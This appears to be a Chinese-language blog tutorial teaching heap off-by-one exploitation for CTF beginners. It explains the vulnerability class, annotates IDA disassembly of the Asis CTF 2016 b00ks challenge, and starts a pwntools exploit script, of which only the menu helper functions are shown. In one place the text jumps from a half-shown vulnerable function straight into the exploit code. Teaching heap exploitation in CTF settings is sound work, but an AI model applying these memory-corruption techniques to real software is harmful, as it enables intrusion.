# pwn堆入门系列教程1
因为自己学堆的时候，找不到一个系统的教程，我将会按照ctf-wiki的目录一步步学下去，尽量做到每周有更新，方便跟我一样刚入门堆的人学习，第一篇教程研究了4天吧，途中没人指导。。很尴尬，自己一个很容易的点研究了很久才懂，把踩过的坑也总结下，方便后人不再踩坑  
[学习链接](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/)
## 环境搭建
[具体搭建方法点我](https://xz.aliyun.com/t/5749)
## off by one原理（引用ctf-wiki)
off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size
正好就只多了一个字节的情况。其中边界验证不严通常包括
使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。  
字符串操作不合适  
一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one
漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap
based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。
## off-by-one 利用思路（引用ctf-wiki)
溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法  
溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free
块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 prev_size 域就会启用，就可以伪造
prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的后一块（理论上是当前正在
unlink 的块）与当前正在 unlink 的块大小是否相等。
## off by one 自己理解
其实就是程序员不小心，我们自己刚写代码的时候也是那样，经常会搞错，比如如下c代码
    #include 
    #include 
    int main()
    {
        char str[5]={0};
        str[5] = '\0';
        return 0;
    }
这段代码相信类似的，我们都写过，我们数组最高是  
数组总长为5，数组下标从0开始，最大为4，而我们错误地使用了str[5],造成越界写了一个字节，这就是off-by-one，可这个开始我也没懂这个的强大，直到做了一道题目
### Asis CTF 2016 b00ks
ctf-wiki上用了两种方法解这道题，我也就照着他的exp，一步步调试，没注释就慢慢理解，搞定了，他有纯利用off-by-one的，也有同时利用unlink跟off-by-one的，下面对这两种方法进行解释
先指出ida解析错误部分
    if ( v3 )
    {
        *(v3 + 6) = v1;
        *(off_202010 + v2) = v3;
        *(v3 + 2) = v5;
        *(v3 + 1) = ptr;
        *v3 = ++unk_202024;
        return 0LL;
    }
这个v3加6是错误的偏移，应该是v3+3，具体看汇编代码就可以了
    text:0000000000001122 ; 48:                   *(v3 + 6) = v1;
    .text:0000000000001122
    .text:0000000000001122 loc_1122:                               ; CODE XREF: Create+1B8↑j
    .text:0000000000001122                 mov     eax, [rbp+var_20]
    .text:0000000000001125                 mov     edx, eax
    .text:0000000000001127                 mov     rax, [rbp+var_18]
    .text:000000000000112B                 mov     [rax+18h], edx
    .text:000000000000112E ; 49:                   *(off_202010 + v2) = v3;
    .text:000000000000112E                 lea     rax, off_202010
    .text:0000000000001135                 mov     rax, [rax]
    .text:0000000000001138                 mov     edx, [rbp+var_1C]
    .text:000000000000113B                 movsxd  rdx, edx
    .text:000000000000113E                 shl     rdx, 3
    .text:0000000000001142                 add     rdx, rax
    .text:0000000000001145                 mov     rax, [rbp+var_18]
    .text:0000000000001149                 mov     [rdx], rax
    .text:000000000000114C ; 50:                   *(v3 + 2) = v5;
    .text:000000000000114C                 mov     rax, [rbp+var_18]
    .text:0000000000001150                 mov     rdx, [rbp+var_8]
    .text:0000000000001154                 mov     [rax+10h], rdx
    .text:0000000000001158 ; 51:                   *(v3 + 1) = ptr;
    .text:0000000000001158                 mov     rax, [rbp+var_18]
    .text:000000000000115C                 mov     rdx, [rbp+ptr]
    .text:0000000000001160                 mov     [rax+8], rdx
    .text:0000000000001164 ; 52:                   *v3 = ++unk_202024;
    .text:0000000000001164                 lea     rax, unk_202024
    .text:000000000000116B                 mov     eax, [rax]
    .text:000000000000116D                 lea     edx, [rax+1]
    .text:0000000000001170                 lea     rax, unk_202024
    .text:0000000000001177                 mov     [rax], edx
    .text:0000000000001179                 lea     rax, unk_202024
    .text:0000000000001180                 mov     edx, [rax]
    .text:0000000000001182                 mov     rax, [rbp+var_18]
    .text:0000000000001186                 mov     [rax], edx
    .text:0000000000001188                 mov     eax, 0
看每段的mov语句，
  * 第一段是mov [rax+18h],edx对应v3+6?
  * 第二段不看，加了变量
  * 第三段是mov [rax+10h],rdx对应v3+2？
#### off-by-one 攻击过程
出现这个漏洞的函数在这
    signed __int64 __fastcall sub_9F5(_BYTE *a1, int a2)
    {
      int i; // [rsp+14h] [rbp-Ch]
      _BYTE *buf; // [rsp+18h] [rbp-8h]
      if ( a2 ")
        io.sendline(str(choice))
    def create(book_size, book_name, desc_size, desc):
        cmd(1)
        io.sendlineafter(": ", str(book_size))
        io.recvuntil(": ")
        if len(book_name) == book_size:#deal with overflow
            io.send(book_name)
        else:
            io.sendline(book_name)
        io.recvuntil(": ")
        io.sendline(str(desc_size))
        if len(desc) == desc_size:
            io.send(desc)
        else:
            io.sendline(desc)
    def remove(idx):
        cmd(2)
        io.sendlineafter(": ", str(idx))
    def edit(idx, desc):
        cmd(3)
        io.sendlineafter(": ", str(idx))
        io.sendlineafter(": ", str(desc))
    def printbook(id):